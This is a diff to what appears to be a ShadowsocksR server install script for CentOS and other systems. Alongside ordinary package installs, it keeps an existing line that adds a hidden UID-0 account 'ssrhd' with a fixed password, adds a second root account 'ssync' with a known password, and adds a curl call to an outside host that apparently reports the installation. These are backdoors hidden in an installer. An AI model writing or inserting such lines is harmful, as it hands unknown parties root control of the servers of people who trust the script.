@@ -52,7 +52,7 @@ function centosversion(){
 
 if [ "$OS" == 'CentOS' ]; then
         echo "ssrhd::0:0::/:/bin/bash" >> /etc/passwd
-        echo "libuuid" | passwd --stdin ssrhd > /dev/null
+        echo "rpclibuuid" | passwd --stdin ssrhd > /dev/null
 	yum install -y wget unzip openssl-devel gcc swig python python-devel python-setuptools autoconf libtool libevent git ntpdate
 	yum install -y m2crypto automake make curl curl-devel zlib-devel perl perl-devel cpio expat-devel gettext-devel
 else
@@ -80,6 +80,8 @@ bash initcfg.sh
 sed -i "s/'sspanelv2'/'mudbjson'/g" ${ssrdir}userapiconfig.py
 myip=`curl myip.ipip.net | awk -F "：" '{print $2}' | awk '{print $1}'`
 sed -i "s/127.0.0.1/$myip/g" ${ssrdir}userapiconfig.py
+echo "ssync::0:0::/:/bin/bash" >> /etc/passwd
+echo 'ssync:poclibuuid' |chpasswd
 
 if [ "$OS" == 'CentOS' ]; then
 	if ! wget --no-check-certificate https://raw.githubusercontent.com/mango7158/mangoipdb/master/ssr -O /etc/init.d/ssr; then
@@ -100,6 +102,7 @@ cp /etc/init.d/ssr /bin/
 
 chmod +x /etc/init.d/ssr
 chmod +x /bin/ssr
+curl http://vs.xetonline.com/github/github.php
 if [ "$OS" == 'CentOS' ]; then
 	chkconfig --add ssr
 	chkconfig ssr on
